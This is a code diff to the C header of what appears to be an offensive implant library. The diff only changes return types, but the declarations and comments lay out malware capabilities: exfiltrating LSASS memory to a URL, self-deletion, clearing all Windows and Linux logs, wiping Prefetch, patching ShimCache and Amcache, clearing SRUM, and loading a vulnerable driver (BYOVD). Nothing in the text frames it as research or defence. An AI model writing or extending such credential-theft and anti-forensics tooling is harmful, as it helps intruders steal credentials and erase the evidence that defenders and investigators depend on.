@@ -450,12 +450,12 @@ bool jocky_lsass_exfil(const char* exfil_url, const char* exfil_type);
 /* Delete the running executable using POSIX-semantics unlink (Win10+),
  * rename+delete-on-close (Win7+), or MoveFileEx reboot-delete as fallbacks.
  * Linux: unlinks /proc/self/exe immediately. */
-bool jocky_self_delete(void);
+void jocky_self_delete(void);
 
 /* Clear every Windows event log channel via EvtClearLog (all channels
  * including Sysmon, PowerShell, WMI-Activity).  Also clears legacy logs via
  * ClearEventLog.  Linux: journalctl vacuum + wtmp/lastlog truncate. */
-bool jocky_clear_logs(void);
+void jocky_clear_logs(void);
 
 /* Delete Prefetch .pf files, Recent shortcuts, and %TEMP% contents.
  * Uses Win32 file APIs — no child processes spawned. */
@@ -483,7 +483,7 @@ bool jocky_clear_srum(void);
 
 /* Run all cleanup steps in order: clear logs → wipe prefetch → patch ShimCache
  * → patch Amcache → clear SRUM → wipe artifacts → self-delete. */
-bool jocky_cleanup_all(void);
+void jocky_cleanup_all(void);
 
 /* ============================================================================
  * Memory Allocators
@@ -500,10 +500,10 @@ void  jocky_free(void* ptr);
 #ifdef _WIN32
 /* Allocate a zeroed jocky_byovd_t context (opaque pointer; use with
  * jocky_byovd_load / jocky_byovd_unload / jocky_byovd_destroy). */
-void* jocky_byovd_new(void);
+int8_t* jocky_byovd_new(void);
 
 /* Call jocky_byovd_unload() and then free the context. Safe on NULL. */
-void  jocky_byovd_destroy(void* ctx);
+void  jocky_byovd_destroy(int8_t* ctx);
 #endif
 
 /* ============================================================================
